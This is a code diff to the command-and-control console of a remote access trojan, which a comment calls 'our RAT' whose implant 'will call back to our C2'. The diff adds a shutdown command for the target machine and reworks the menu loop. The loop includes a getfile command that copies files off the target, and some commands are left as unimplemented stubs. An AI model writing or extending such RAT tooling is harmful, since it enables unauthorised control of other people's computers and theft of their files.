@@ -12,6 +12,7 @@ import ctypes
 import Common
 import Disconnect
 import File
+import Shutdown
 import Dir
 
 
@@ -37,9 +38,10 @@ def establishConnection(host_ip: str, host_port : int) -> socket.socket:
 def printHelp() -> str:
     return 'Please choose from the following options: \n' \
     '\t 0) disconnect\n' \
-    '\t 1) getfile\n' \
-    '\t 2) putfile\n' \
-    '\t 3) dirlist\n' 
+    '\t 1) shutdown\n' \
+    '\t 2) getfile\n' \
+    '\t 3) putfile\n' \
+    '\t 4) dirlist\n' 
 
 
 # Main starting point for our RAT; implant will call back to our C2 when executed (with its configured port)
@@ -80,6 +82,10 @@ def main():
                 else:
                     sock = new_sock # update our existing socket
 
+            case Common.Commands.shutdown:
+                Shutdown.handleShutdown()
+                exit = True # Guess we're done here 
+
             case Common.Commands.getfile:
                 # Get the filepath for what we'll read off target
                 target_file_path = str(input("File location on target > "))
@@ -88,22 +94,23 @@ def main():
                 local_file_path = str(input("File location to write locally > "))
 
                 if (not File.handleGetFile(sock, target_file_path, local_file_path)):
-                    print("Failed to get file from target")
-
-                return
+                    print("Failed to get file from target") 
             
             # TODO: implement
             case Common.Commands.putfile:
-                return
+                print("Not yet implemented")
             
             # TODO: implement
             case Common.Commands.dirlist:
-                return
+                print("Not yet implemented")
+
+            case Common.Commands.survey:
+                print("Not yet implemented")
             
             case _:
                 print("Invalid choice!")
 
-        
+    return
 
 if __name__ == '__main__':
     main()
